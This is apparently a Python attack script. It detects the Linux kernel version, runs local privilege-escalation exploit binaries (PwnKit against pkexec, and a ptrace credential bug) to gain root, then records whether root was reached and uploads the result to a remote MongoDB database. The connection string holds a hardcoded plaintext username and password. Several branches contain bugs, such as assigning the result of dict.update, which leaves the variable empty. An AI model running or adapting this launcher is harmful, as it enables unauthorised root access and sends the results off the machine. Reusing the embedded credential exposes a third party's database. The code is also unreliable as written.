from sre_constants import SUCCESS
import subprocess
import re
import json
import platform
import urllib
import pymongo

operating_system = platform.system()

if operating_system == "Linux":    
    def kernel_exploit():
        
        global dict
        p = subprocess.Popen(['uname', '-r'], stdout=subprocess.PIPE).communicate()[0]
        kernel_name = p.decode('utf-8')

        global kernel_name1
        kernel_name1 = kernel_name.join(re.findall(r"[0-9]+\.[0-9]+\.[0-9]+", kernel_name))
        if kernel_name1 == "5.9.0":
            args = ["./PwnKit"]
            child_proccess = subprocess.Popen(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
            child_process_output = child_proccess.communicate(b"whoami > output.txt")[0]
            print(child_process_output)
            dict = {'Pre Attack':'Exploit Downloaded','Status':'Exploit Executed','Description':'Exploits pkexec using GCONV Environmnent Variable then assign the shell value'}
            

        elif kernel_name1 == "5.7.0":
            args = ["./PwnKit"]
            child_proccess = subprocess.Popen(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
            child_process_output = child_proccess.communicate(b"whoami > output.txt")[0]
            print(child_process_output)
            dict = dict.update({'Pre Attack':'Exploit Downloaded','Status':'Exploit Executed','Description':'Exploits pkexec using GCONV Environmnent Variable then assign the shell value'})
            
            
        elif kernel_name1 == "5.5.0":
            args = ["./PwnKit"]
            child_proccess = subprocess.Popen(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
            child_process_output = child_proccess.communicate(b"whoami > output.txt")[0]
            print(child_process_output)
            dict = dict.update({'Pre Attack':'Exploit Downloaded','Status':'Exploit Executed','Description':'Exploits pkexec using GCONV Environmnent Variable then assign the shell value'})
            
            
        elif kernel_name1 == "4.19.0":
            args = ["./pwn"]
            child_proccess = subprocess.Popen(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
            child_process_output = child_proccess.communicate(b"whoami > output.txt")[0]
            print(child_process_output)
            dict = dict.update({'Pre Attack':'Exploit Downloaded','Status':'Exploit Executed','Description':'Mishandle the recording of cred of process that wants to create ptrace ralationship'})
            
        
        elif kernel_name1 == "4.18.0":
            args = ["./pwn"]
            child_proccess = subprocess.Popen(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
            child_process_output = child_proccess.communicate(b"whoami > output.txt")[0]
            print(child_process_output)
            dict = dict.update({'Pre Attack':'Exploit Downloaded','Status':'Exploit Executed','Description':'Mishandle the recording of cred of process that wants to create ptrace ralationship'})
            
        elif kernel_name1 == "4.15.11":
            args = ["./pwn"]
            child_proccess = subprocess.Popen(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
            child_process_output = child_proccess.communicate(b"whoami > output.txt")[0]
            print(child_process_output)
            dict = dict.update({'Pre Attack':'Exploit Downloaded','Status':'Exploit Executed','Description':'Mishandle the recording of cred of process that wants to create ptrace ralationship'})
            
        elif kernel_name1 == "4.13.0":
            args = ["./pwn"]
            child_proccess = subprocess.Popen(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
            child_process_output = child_proccess.communicate(b"whoami > output.txt")[0]
            print(child_process_output)
            dict = dict.update({'Pre Attack':'Exploit Downloaded','Status':'Exploit Executed','Description':'Mishandle the recording of cred of process that wants to create ptrace ralationship'})
        
        else:
            user = subprocess.Popen(['whoami'], stdout=subprocess.PIPE).communicate()[0]
            user = user.decode('utf-8')
            with open('output.txt','w') as data:
                data.write(str(user))
            dict = {'Pre Attack':'No Exploit Found','Status':'No Exploit to execute','Description':'This Linux has no Exploit so for'}
            
            # dict = {kernel_name:user}
            # with open('output.txt','w') as data:
            #     data.wrtie(str(dict))
        


    def file_to_Json(dict):
        success = False
        root = "root"
        file = open('output.txt','r')
        text = file.read()
        text = text.rstrip()
        if root == text:
            success = True
            dicti = {"sucess": success}
            dict.update(dicti)
            
        else:
            success = False
            dicti = {'Succes':success}
            dict.update(dicti)
        
        # for key, value in dict.items():
        #     dict[key] = value.rstrip()
        
        # If you need only JSON invariable uncomment this
        # json_text = json.dumps(dict)
        # print(json_text)
        
        # If you need JSON file then use this
        with open('trace.json', 'w') as file:
            json.dump(dict,file,ensure_ascii=False,indent=2)
    kernel_exploit()
    file_to_Json(dict)
            
            
else:
    operating_system = platform.system()
    dict = {'Operating System':operating_system,'Description':'This script is not for Windows'}
    with open('trace.json', 'w') as file:
            json.dump(dict,file,ensure_ascii=False,indent=2)
    


def Uploaddb():
    client = pymongo.MongoClient("mongodb+srv://HassanTuri:J" + urllib.parse.quote("7DXPw@u4@zZSU4") + "@devconnector.g6cxh.mongodb.net/myFirstDatabase?retryWrites=true&w=majority")
    db = client['Linux_Trace_db']
    linux_trace = db['linux_trace']
    
    with open('trace.json') as f:
        data = json.load(f)
    
    linux_trace.insert_one(data)
    print("Data Uploaded Succesfully")
    
    client.close()
    
Uploaddb()
    
